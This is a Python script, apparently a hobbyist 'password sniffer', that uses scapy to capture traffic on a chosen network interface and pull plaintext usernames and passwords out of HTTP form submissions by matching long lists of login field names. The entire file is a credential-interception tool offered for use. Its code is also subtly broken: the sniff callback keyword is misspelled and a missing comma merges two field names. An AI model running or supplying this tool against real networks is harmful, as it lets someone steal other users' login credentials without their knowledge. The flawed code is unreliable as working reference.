from scapy.all import *
from urllib import parse
import re

print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
print("$  PASSWORD-SNIFFER CREATED BY  $")
print("$          SOORAJ               $")
print("$        VERSION 1.0            $")
print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
print('\n')
iface = input("[*] Enter the interface : ")


def get_credebtials(body):
    username = None
    password = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
    for user in userfields:
        login_re = re.search('(%s=[^&]+)' % user, body, re.IGNORECASE)
        if login_re:
            username = login_re.group()
    for passwd in passfields:
        passwd_re = re.search('(%s=[^&]+)' % passwd, body, re.IGNORECASE)
        if passwd_re:
            password = passwd_re.group()
    if username and password:
        return username, password


def packet_parser(packet):
    # Packet inspection. Looking for Tcp, raw and ip layer
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        # Payload contains the username and password
        body = str(packet[TCP].payload)
        username_password = get_credebtials(body)

        if username_password is not None:
            print(packet[TCP].payload)
            print(parse.unquote(username_password[0]))
            print(parse.unquote(username_password[1]))
        else:
            pass


try:
    sniff(iface=iface, psn=packet_parser, store=0)
except KeyboardInterrupt:
    print("[*] Closing the application [*]")
